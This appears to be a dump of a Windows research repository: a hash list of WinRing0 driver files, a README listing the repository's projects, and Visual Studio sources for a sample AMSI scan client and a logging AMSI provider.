589ed823e9a84c56feb95ac58e7cf384626b9cbf4fda2a907bc36e103de1bad2 *source\WormholeDrivers\WINRING0\LICENSE
b11f8a6914620ec3e7d1fd6743e6f901276331a700f365d34bc03326d0042e60 *source\WormholeDrivers\WINRING0\README.md
530ef49a2a65853628374ffa175faeb503ca393f558c9ba1ceb870c0ed301525 *source\WormholeDrivers\WINRING0\dll\Driver.cpp
cc5c0b307ca1783feaed16be642f9e0abc6bdd96c3d543377166629100f4137e *source\WormholeDrivers\WINRING0\dll\Driver.h
ca3ca772f5bcbf4d9e2d216993f884f0c2594223f50711b34bdf0bbf7e94753a *source\WormholeDrivers\WINRING0\dll\OlsApi.cpp
ccda03ebc5da4eb754fcf47640eddc0a57e40e04d0729573f113a38a11afbb64 *source\WormholeDrivers\WINRING0\dll\OlsApi.def
4a3218ee62427df45f25e20acc1943b3203c1f8ab8a7aa10a84744bfac44dafd *source\WormholeDrivers\WINRING0\dll\OlsApi.h
197e98771cc557ab2bcae3170ded1332d7d25f49519f4b80c01b98a7d7ae9a26 *source\WormholeDrivers\WINRING0\dll\OlsApiInit.h
741d809b3df610e669976a434c8fc8ea8912ece9e855ab26291542a4b720e4eb *source\WormholeDrivers\WINRING0\dll\OlsApiInitDef.h
ed9e0d0be82e55ef692c6a1e18098078c20e39fe41775b1b5dca8e2e5b4cbe41 *source\WormholeDrivers\WINRING0\dll\OlsApiInitExt.h
288608fb847f270e4fb13177cd29c042e4886597cb01543d2c15da9e33fbb41a *source\WormholeDrivers\WINRING0\dll\OlsDef.h
82c6d91f976f071b6c62e3ed2ecc15d39332f45c1f7ff826cfa6b57434e08496 *source\WormholeDrivers\WINRING0\dll\OlsDll.cpp
dee203de4a6583ddae9b3b523fcf5ddc56e628293beab476ee5522b0928c92e3 *source\WormholeDrivers\WINRING0\dll\OlsDll.h
e81bf4b6b3be063ffc4988956e2f3d64c0061fe6d9bda232f54de3e2af56588f *source\WormholeDrivers\WINRING0\dll\OlsDll.rc
4b3f28656000c0b385936e0443bb2c48b39b4a43eea7d0f0c3b1fc25d57da425 *source\WormholeDrivers\WINRING0\dll\OlsIoctl.h
a043caaa84b80cecb4ea310951041f3c6b442a334e7c873c6b61059adeec1ce1 *source\WormholeDrivers\WINRING0\dll\resource.h
41d442e970c77579488acecb00787aa353e11ea43a7b4396d415127e40a3f07e *source\WormholeDrivers\WINRING0\dll\stdafx.cpp
1da74c3eb7822f34480c898dd75d12c03b7090ed28dfb06bf5cb317e8cc523cf *source\WormholeDrivers\WINRING0\dll\stdafx.h
e85d21d6a3914bfc6581f3081aa7c32c73230b0dc1589886a8ad49017f535c23 *source\WormholeDrivers\WINRING0\dll\sys\MAKEFILE
13aaaf7c26c33e33bf890439ee74a981510c8060ffcb3c0efee5c643f50a3e69 *source\WormholeDrivers\WINRING0\dll\sys\OpenLibSys.c
9fea8f58e52c1b3f0d2562e1d9f88097945e9a66054fe0ed5a97f857180b2ddb *source\WormholeDrivers\WINRING0\dll\sys\OpenLibSys.h
07664028dca9632746a6de6fd5ea3fd663b0926744d02318c48b3e2f7973dee5 *source\WormholeDrivers\WINRING0\dll\sys\OpenLibSys.rc
bb3e2c376059e39bae0045b5e873cc2ec15f1e27cdd06556110954179145a056 *source\WormholeDrivers\WINRING0\dll\sys\SOURCES
28ccda2fd4045c56821bda96eda38c77f690674c667c736f465d9d63388ecc3f *source\WormholeDrivers\WINRING0\dll\vxd\ctrl.asm
fed92241ac59aa7e0e2051ec757685082ed76dce37db77d6d9e613bd786e882c *source\WormholeDrivers\WINRING0\dll\vxd\Makefile
7aeb73c74153e5f4fb90453e3d5837ae9ce395e41577e0eb52225088ff3d6965 *source\WormholeDrivers\WINRING0\dll\vxd\OpenLS.c
25f5ebc9bfefe2f749f22488c571265d8b87279626bf4b1e845154ba004d172e *source\WormholeDrivers\WINRING0\dll\vxd\OpenLS.def
ed034ad76a22b2660d3cadbb2e7e6c3f63d5ece693a5955264df9c44f7eddf61 *source\WormholeDrivers\WINRING0\dll\vxd\OpenLS.h
f193956fc8f8fc050bedac157c31879d3e52d57cefbdf29f1c2a9d1d0358b198 *source\WormholeDrivers\WINRING0\dll\vxd\OpenLS.rc
85bd0be9631d8107e225cd8bfe5e493b4ca5d232595291ca78594ca8fef07a2d *source\WormholeDrivers\WINRING0\drv\DriverApi.c
b5c96fb4b0c24d28a4f4e35d48c3a4a63f44cfb388e01ddd9086e190603e205c *source\WormholeDrivers\WINRING0\drv\DriverApi.h
635dd3c2dcbcbee75bcf21b6186b5029169cd48079c151efdecdd7f0f7f070e7 *source\WormholeDrivers\WINRING0\drv\DriverIoCtl.h
873c89f120ce99f753813e2596a74bcdad0faaa53e10df33cfc6cf4135d5a732 *source\WormholeDrivers\WINRING0\drv\DriverManage.c

```

`README.md`:

```md
# Misc

### Miscellaneous Code and Docs


source\ApiSetSchemaView
* Windows ApiSetSchema Viewer (V2, V4, V6)

source\StripDebug
* Removes debug information left by VisualStudio 2015+

source\AMSI
* AMSI related experiments
    * sources\AMSI\AmsiProviderATL 
AMSI provider client/server written in C++ using ATL
    * sources\AMSI\AmsiProviderC
AMSI provider server written in C (works with client from ATL version)

source\IntelNal
* Intel QV Linux kernel driver (upload for quick references)

source\ROS
* ReactOS related code
    * sources\ROS\win32u
 ReactOS win32u dll (0.4.10 - 0.4.14)
    * sources\ROS\srvany2
Run application as service

source\SecTrash
* Various AV/Security bugs and related trash found in the beginning of 2020

source\WormholeDrivers
* Collection of "wormhole" open source drivers widely used by hardware vendors sometimes in unmodified state

source\DSEPatch
* DSE patch based on CI callbacks modification, see dsepatch\readme for more info

source\wdextract (for a more advanced version visit https://github.com/hfiref0x/wdextract)
* Extract Windows Defender database from vdm files and unpack it

source\DrvTools
* Auxiliary utility to work with Windows Drivers

# Authors
* (c) Intel QV authors
* (c) PHYMEM, MAPMEM, WINIO, WINRING0 authors
* (c) 2015 - 2022, hfiref0x

```

`source/AMSI/AmsiProviderATL/AmsiClient/AmsiClient.cpp`:

```cpp
#include "pch.h"
#include <iostream>
#include <amsi.h>

#pragma comment(lib, "amsi.lib")

int main()
{
    std::cout << "Hello World!\n";

    HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);

    if (!SUCCEEDED(hr)) {
        std::cout << "CoInitializeEx error = " << std::hex << hr << "\n";
        return -1;
    }

    HAMSICONTEXT amsiContext = nullptr;

    hr = AmsiInitialize(L"Amsi Scanner", &amsiContext);
    if (!SUCCEEDED(hr)) {
        std::cout << "AmsiInitialize error = " << std::hex << hr << "\n";
        return -2;
    }

    HAMSISESSION amsiSession = nullptr;
    hr = AmsiOpenSession(amsiContext, &amsiSession);
    if (!SUCCEEDED(hr)) {
        std::cout << "AmsiOpenSession error = " << std::hex << hr << "\n";
        return -2;
    }

    UCHAR ScanBuffer[] = "Scanned buffer";

    AMSI_RESULT ScanResult;
    hr = AmsiScanBuffer(amsiContext, ScanBuffer, sizeof(ScanBuffer), L"ScanContentName", amsiSession, &ScanResult);
    if (!SUCCEEDED(hr)) {
        std::cout << "AmsiScanBuffer error = " << std::hex << hr << "\n";
        return -2;
    }

    if (AmsiResultIsMalware(ScanResult)) {
        std::cout << "Malware detected." << "\n";
    }
    else {
        std::cout << "Not detected." << "\n";
    }

    AmsiCloseSession(amsiContext, amsiSession);
    AmsiUninitialize(amsiContext);
    CoUninitialize();
}


```

`source/AMSI/AmsiProviderATL/AmsiClient/AmsiClient.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>AmsiClient</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="AmsiClient.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiClient/AmsiClient.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="AmsiClient.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiClient/AmsiClient.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiClient/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`source/AMSI/AmsiProviderATL/AmsiClient/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`source/AMSI/AmsiProviderATL/AmsiScan.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.136
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AmsiScanServer", "AmsiServer\AmsiScan\AmsiScan.vcxproj", "{D131A205-F090-4CF5-8441-32074FE5398E}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AmsiScanPS", "AmsiServer\AmsiScanPS\AmsiScanPS.vcxproj", "{19E4CA54-321F-481D-A457-48C4E3F3E85C}"
	ProjectSection(ProjectDependencies) = postProject
		{D131A205-F090-4CF5-8441-32074FE5398E} = {D131A205-F090-4CF5-8441-32074FE5398E}
	EndProjectSection
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AmsiClient", "AmsiClient\AmsiClient.vcxproj", "{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{D131A205-F090-4CF5-8441-32074FE5398E}.Debug|x64.ActiveCfg = Debug|x64
		{D131A205-F090-4CF5-8441-32074FE5398E}.Debug|x64.Build.0 = Debug|x64
		{D131A205-F090-4CF5-8441-32074FE5398E}.Debug|x86.ActiveCfg = Debug|Win32
		{D131A205-F090-4CF5-8441-32074FE5398E}.Debug|x86.Build.0 = Debug|Win32
		{D131A205-F090-4CF5-8441-32074FE5398E}.Release|x64.ActiveCfg = Release|x64
		{D131A205-F090-4CF5-8441-32074FE5398E}.Release|x64.Build.0 = Release|x64
		{D131A205-F090-4CF5-8441-32074FE5398E}.Release|x86.ActiveCfg = Release|Win32
		{D131A205-F090-4CF5-8441-32074FE5398E}.Release|x86.Build.0 = Release|Win32
		{19E4CA54-321F-481D-A457-48C4E3F3E85C}.Debug|x64.ActiveCfg = Debug|x64
		{19E4CA54-321F-481D-A457-48C4E3F3E85C}.Debug|x86.ActiveCfg = Debug|Win32
		{19E4CA54-321F-481D-A457-48C4E3F3E85C}.Release|x64.ActiveCfg = Release|x64
		{19E4CA54-321F-481D-A457-48C4E3F3E85C}.Release|x86.ActiveCfg = Release|Win32
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Debug|x64.ActiveCfg = Debug|x64
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Debug|x64.Build.0 = Debug|x64
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Debug|x86.ActiveCfg = Debug|Win32
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Debug|x86.Build.0 = Debug|Win32
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Release|x64.ActiveCfg = Release|x64
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Release|x64.Build.0 = Release|x64
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Release|x86.ActiveCfg = Release|Win32
		{CDEC113D-ECE3-4F4B-B3FE-01C5E085DA99}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {C3FB4B87-8F9C-4BDC-BE98-48B9ACE36E15}
	EndGlobalSection
EndGlobal

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiProvider.cpp`:

```cpp
// AmsiProvider.cpp : Implementation of CAmsiProvider

#include "stdafx.h"
#include "AmsiProvider.h"

template<typename TypeName>
class MemoryBuffer
{
private:
    TypeName* Buffer = nullptr;
public:
    MemoryBuffer() {}
    MemoryBuffer(const MemoryBuffer& other) = delete;
    MemoryBuffer(MemoryBuffer&& other) : Buffer(other.Buffer) { other.Buffer = nullptr; }
    MemoryBuffer& operator=(const MemoryBuffer& other) = delete;
    MemoryBuffer& operator=(MemoryBuffer&& other) {
        auto tempBuffer = Buffer; Buffer = other.Buffer; other.Buffer = tempBuffer;
        return *this;
    }

    ~MemoryBuffer() { if (Buffer) HeapFree(GetProcessHeap(), 0, Buffer); }
    HRESULT AllocBuffer(size_t size)
    {
        Buffer = reinterpret_cast<TypeName*>(HeapAlloc(GetProcessHeap(), 0, size));
        return Buffer ? S_OK : E_OUTOFMEMORY;
    }

    TypeName* Get() { return Buffer; }
    operator bool() { return Buffer != nullptr; }
};

MemoryBuffer<wchar_t> AmsiGetStringAttribute(
    _In_ IAmsiStream* stream,
    _In_ AMSI_ATTRIBUTE attribute)
{
    MemoryBuffer<wchar_t> result;
    ULONG allocSize;
    ULONG actualSize;

    if (stream->GetAttribute(attribute, 0, nullptr, &allocSize) == E_NOT_SUFFICIENT_BUFFER &&
        SUCCEEDED(result.AllocBuffer(allocSize)) &&
        SUCCEEDED(stream->GetAttribute(attribute, allocSize, reinterpret_cast<PBYTE>(result.Get()), &actualSize)) &&
        actualSize <= allocSize)
    {
        return result;
    }
    return MemoryBuffer<wchar_t>();
}

template<typename TypeName>
TypeName AmsiGetFixedSizeAttribute(_In_ IAmsiStream* stream, _In_ AMSI_ATTRIBUTE attribute)
{
    TypeName result;

    ULONG actualSize;
    if (SUCCEEDED(stream->GetAttribute(attribute, sizeof(TypeName), reinterpret_cast<PBYTE>(&result), &actualSize)) &&
        actualSize == sizeof(TypeName))
    {
        return result;
    }
    return TypeName();
}


// CAmsiProvider

HRESULT STDMETHODCALLTYPE CAmsiProvider::Scan(
    _In_ IAmsiStream *stream,
    _Out_ AMSI_RESULT *result)
{
    OutputDebugString(L"AmsiProvider->Scan\r\n");

    auto AppName = AmsiGetStringAttribute(stream, AMSI_ATTRIBUTE_APP_NAME);

    if (AppName) {

        OutputDebugString(L"AMSI_ATTRIBUTE_APP_NAME\r\n");
        OutputDebugString(AppName.Get());
        OutputDebugString(L"\r\n");

    }

    auto ContentName = AmsiGetStringAttribute(stream, AMSI_ATTRIBUTE_CONTENT_NAME);

    if (ContentName) {

        OutputDebugString(L"AMSI_ATTRIBUTE_CONTENT_NAME\r\n");
        OutputDebugString(ContentName.Get());
        OutputDebugString(L"\r\n");

    }

    *result = AMSI_RESULT_NOT_DETECTED;
    return S_OK;
}

void STDMETHODCALLTYPE CAmsiProvider::CloseSession(
    _In_ ULONGLONG session)
{
    OutputDebugString(L"AmsiProvider->CloseSession\r\n");
}

HRESULT STDMETHODCALLTYPE CAmsiProvider::DisplayName(
    _Outptr_ LPWSTR *displayName)
{
    OutputDebugString(L"AmsiProvider->DisplayName\r\n");

    *displayName = const_cast<LPWSTR>(L"Custom AMSI Provider");
    return S_OK;
}

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiProvider.h`:

```h
// AmsiProvider.h : Declaration of the CAmsiProvider

#pragma once
#include "resource.h"       // main symbols



#include "AmsiScan_i.h"
#include <amsi.h>


#if defined(_WIN32_WCE) && !defined(_CE_DCOM) && !defined(_CE_ALLOW_SINGLE_THREADED_OBJECTS_IN_MTA)
#error "Single-threaded COM objects are not properly supported on Windows CE platform, such as the Windows Mobile platforms that do not include full DCOM support. Define _CE_ALLOW_SINGLE_THREADED_OBJECTS_IN_MTA to force ATL to support creating single-thread COM object's and allow use of it's single-threaded COM object implementations. The threading model in your rgs file was set to 'Free' as that is the only threading model supported in non DCOM Windows CE platforms."
#endif

using namespace ATL;


// CAmsiProvider

class ATL_NO_VTABLE CAmsiProvider :
	public CComObjectRootEx<CComSingleThreadModel>,
	public CComCoClass<CAmsiProvider, &CLSID_AmsiProvider>,
    public IAntimalwareProvider
{
public:
	CAmsiProvider()
	{
	}

DECLARE_REGISTRY_RESOURCEID(IDR_AMSIPROVIDER)


BEGIN_COM_MAP(CAmsiProvider)
    COM_INTERFACE_ENTRY(IAntimalwareProvider)
END_COM_MAP()



	DECLARE_PROTECT_FINAL_CONSTRUCT()

	HRESULT FinalConstruct()
	{
		return S_OK;
	}

	void FinalRelease()
	{
	}

public:

    HRESULT STDMETHODCALLTYPE Scan(
        _In_ IAmsiStream *stream,
        _Out_ AMSI_RESULT *result);

    void STDMETHODCALLTYPE CloseSession(
        _In_ ULONGLONG session);

    HRESULT STDMETHODCALLTYPE DisplayName(
        _Outptr_ LPWSTR *displayName);

};

OBJECT_ENTRY_AUTO(__uuidof(AmsiProvider), CAmsiProvider)

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiProvider.rgs`:

```rgs
HKCR
{
	NoRemove CLSID
	{
		ForceRemove {1c0643e1-5b0a-4420-9b76-0de9264b4c59} = s 'AmsiProvider'
		{
			ForceRemove Programmable
			InprocServer32 = s '%MODULE%'
			{
				val ThreadingModel = s 'Both'
			}
		}
	}
}

HKLM
{
	NoRemove SOFTWARE {
		NoRemove Microsoft {
			NoRemove AMSI {
				NoRemove Providers {
					ForceRemove {1c0643e1-5b0a-4420-9b76-0de9264b4c59} = s 'AmsiProvider'
				}
			}
		}
	}
}

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.cpp`:

```cpp
// AmsiScan.cpp : Implementation of DLL Exports.


#include "stdafx.h"
#include "resource.h"
#include "AmsiScan_i.h"
#include "dllmain.h"


using namespace ATL;

// Used to determine whether the DLL can be unloaded by OLE.
_Use_decl_annotations_
STDAPI DllCanUnloadNow(void)
{
	return _AtlModule.DllCanUnloadNow();
}

// Returns a class factory to create an object of the requested type.
_Use_decl_annotations_
STDAPI DllGetClassObject(_In_ REFCLSID rclsid, _In_ REFIID riid, _Outptr_ LPVOID* ppv)
{
	return _AtlModule.DllGetClassObject(rclsid, riid, ppv);
}

// DllRegisterServer - Adds entries to the system registry.
_Use_decl_annotations_
STDAPI DllRegisterServer(void)
{
	// registers object, typelib and all interfaces in typelib
	HRESULT hr = _AtlModule.DllRegisterServer();
	return hr;
}

// DllUnregisterServer - Removes entries from the system registry.
_Use_decl_annotations_
STDAPI DllUnregisterServer(void)
{
	HRESULT hr = _AtlModule.DllUnregisterServer();
	return hr;
}

// DllInstall - Adds/Removes entries to the system registry per user per machine.
STDAPI DllInstall(BOOL bInstall, _In_opt_  LPCWSTR pszCmdLine)
{
	HRESULT hr = E_FAIL;
	static const wchar_t szUserSwitch[] = L"user";

	if (pszCmdLine != nullptr)
	{
		if (_wcsnicmp(pszCmdLine, szUserSwitch, _countof(szUserSwitch)) == 0)
		{
			ATL::AtlSetPerUserRegistration(true);
		}
	}

	if (bInstall)
	{
		hr = DllRegisterServer();
		if (FAILED(hr))
		{
			DllUnregisterServer();
		}
	}
	else
	{
		hr = DllUnregisterServer();
	}

	return hr;
}



```

